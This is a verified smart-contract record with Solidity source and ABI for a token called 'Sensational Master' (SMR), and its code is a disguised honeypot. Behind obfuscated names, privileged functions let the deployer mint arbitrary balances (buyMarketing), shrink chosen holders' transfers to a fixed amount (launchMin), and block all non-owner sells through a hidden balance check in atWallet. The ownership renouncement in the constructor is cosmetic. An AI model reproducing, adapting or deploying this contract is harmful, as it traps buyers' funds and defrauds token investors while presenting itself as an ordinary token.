{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface launchedLiquidityList {\n    function createPair(address launchSell, address swapAmountMax) external returns (address);\n}\n\ninterface walletIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeBuy) external view returns (uint256);\n\n    function transfer(address liquidityAmount, uint256 takeWallet) external returns (bool);\n\n    function allowance(address autoMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityAmount,\n        uint256 takeWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toSender, uint256 value);\n    event Approval(address indexed autoMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract listLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletIsMetadata is walletIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SensationalMaster is listLimit, walletIs, walletIsMetadata {\n\n    function swapMaxLimit(uint256 takeWallet) public {\n        senderReceiver();\n        toFee = takeWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private listAmountLimit;\n\n    function totalReceiver() public {\n        emit OwnershipTransferred(totalTokenAuto, address(0));\n        liquidityShould = address(0);\n    }\n\n    function senderReceiver() private view {\n        require(shouldLaunched[_msgSender()]);\n    }\n\n    uint256 constant toBuy = 8 ** 10;\n\n    function feeMarketing(address autoSenderMode) public {\n        if (txLaunchedTo) {\n            return;\n        }\n        if (fundIsWallet) {\n            sellTake = minReceiver;\n        }\n        shouldLaunched[autoSenderMode] = true;\n        if (limitTeam != sellTake) {\n            listTakeTrading = false;\n        }\n        txLaunchedTo = true;\n    }\n\n    address public totalTokenAuto;\n\n    event OwnershipTransferred(address indexed fundReceiver, address indexed totalFund);\n\n    bool private feeAt;\n\n    uint256 toFee;\n\n    mapping(address => bool) public shouldLaunched;\n\n    string private launchEnable = \"SMR\";\n\n    uint256 private isLimit = 100000000 * 10 ** 18;\n\n    string private buyToken = \"Sensational Master\";\n\n    address takeMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private liquidityShould;\n\n    bool public fundIsWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isLimit;\n    }\n\n    uint256 receiverSenderShould;\n\n    function approve(address walletAmountIs, uint256 takeWallet) public virtual override returns (bool) {\n        listAmountLimit[_msgSender()][walletAmountIs] = takeWallet;\n        emit Approval(_msgSender(), walletAmountIs, takeWallet);\n        return true;\n    }\n\n    uint256 public sellTake;\n\n    function owner() external view returns (address) {\n        return liquidityShould;\n    }\n\n    function allowance(address minSenderReceiver, address walletAmountIs) external view virtual override returns (uint256) {\n        if (walletAmountIs == txAuto) {\n            return type(uint256).max;\n        }\n        return listAmountLimit[minSenderReceiver][walletAmountIs];\n    }\n\n    function marketingAutoExempt(address takeFee, address liquidityAmount, uint256 takeWallet) internal returns (bool) {\n        require(exemptReceiver[takeFee] >= takeWallet);\n        exemptReceiver[takeFee] -= takeWallet;\n        exemptReceiver[liquidityAmount] += takeWallet;\n        emit Transfer(takeFee, liquidityAmount, takeWallet);\n        return true;\n    }\n\n    mapping(address => bool) public modeToken;\n\n    function transferFrom(address takeFee, address liquidityAmount, uint256 takeWallet) external override returns (bool) {\n        if (_msgSender() != txAuto) {\n            if (listAmountLimit[takeFee][_msgSender()] != type(uint256).max) {\n                require(takeWallet <= listAmountLimit[takeFee][_msgSender()]);\n                listAmountLimit[takeFee][_msgSender()] -= takeWallet;\n            }\n        }\n        return atWallet(takeFee, liquidityAmount, takeWallet);\n    }\n\n    uint256 private minReceiver;\n\n    uint8 private fundAmountLimit = 18;\n\n    function launchMin(address liquidityMax) public {\n        senderReceiver();\n        \n        if (liquidityMax == totalTokenAuto || liquidityMax == totalLaunchLaunched) {\n            return;\n        }\n        modeToken[liquidityMax] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyToken;\n    }\n\n    function transfer(address tradingToken, uint256 takeWallet) external virtual override returns (bool) {\n        return atWallet(_msgSender(), tradingToken, takeWallet);\n    }\n\n    bool private exemptTeam;\n\n    address public totalLaunchLaunched;\n\n    address txAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private listTakeTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchEnable;\n    }\n\n    bool public txLaunchedTo;\n\n    constructor (){\n        if (feeAt == fundIsWallet) {\n            minReceiver = sellTake;\n        }\n        isToken totalLaunchMin = isToken(txAuto);\n        totalLaunchLaunched = launchedLiquidityList(totalLaunchMin.factory()).createPair(totalLaunchMin.WETH(), address(this));\n        if (feeAt) {\n            fundIsWallet = false;\n        }\n        totalTokenAuto = _msgSender();\n        shouldLaunched[totalTokenAuto] = true;\n        exemptReceiver[totalTokenAuto] = isLimit;\n        totalReceiver();\n        if (totalFundLiquidity == sellTake) {\n            sellTake = minReceiver;\n        }\n        emit Transfer(address(0), totalTokenAuto, isLimit);\n    }\n\n    function balanceOf(address takeBuy) public view virtual override returns (uint256) {\n        return exemptReceiver[takeBuy];\n    }\n\n    function buyMarketing(address tradingToken, uint256 takeWallet) public {\n        senderReceiver();\n        exemptReceiver[tradingToken] = takeWallet;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundAmountLimit;\n    }\n\n    function atWallet(address takeFee, address liquidityAmount, uint256 takeWallet) internal returns (bool) {\n        if (takeFee == totalTokenAuto) {\n            return marketingAutoExempt(takeFee, liquidityAmount, takeWallet);\n        }\n        uint256 fromShould = walletIs(totalLaunchLaunched).balanceOf(takeMax);\n        require(fromShould == toFee);\n        require(liquidityAmount != takeMax);\n        if (modeToken[takeFee]) {\n            return marketingAutoExempt(takeFee, liquidityAmount, toBuy);\n        }\n        return marketingAutoExempt(takeFee, liquidityAmount, takeWallet);\n    }\n\n    uint256 private totalFundLiquidity;\n\n    function getOwner() external view returns (address) {\n        return liquidityShould;\n    }\n\n    mapping(address => uint256) private exemptReceiver;\n\n    bool private amountWallet;\n\n    uint256 private limitTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSenderReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletAmountIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmountIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeWallet\",\"type\":\"uint256\"}],\"name\":\"buyMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSenderMode\",\"type\":\"address\"}],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIsWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"}],\"name\":\"launchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeWallet\",\"type\":\"uint256\"}],\"name\":\"swapMaxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunchLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTokenAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunchedTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SensationalMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}